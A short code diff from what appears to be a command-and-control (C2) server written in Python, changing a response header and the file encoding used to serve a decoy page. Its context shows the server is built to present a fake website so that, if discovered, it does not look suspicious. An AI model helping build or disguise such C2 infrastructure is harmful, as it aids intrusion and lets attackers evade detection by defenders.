@@ -51,11 +51,11 @@ class C2RequestHandler(BaseHTTPRequestHandler):
 
         # Default response - fake website
         self.send_response(200)
-        self.send_header("Content-type", "text/html")
+        self.send_header("Content-Type", "text/html; charset=UTF-8")
         self.end_headers()
 
         # Send a fake website so if someone discovers the server, it doesn't look suspicious
-        with open("console.html", 'r') as f:
+        with open("console.html", 'r', encoding='utf-8') as f:
             fake_site = f.read()
         self.wfile.write(fake_site.encode())
 
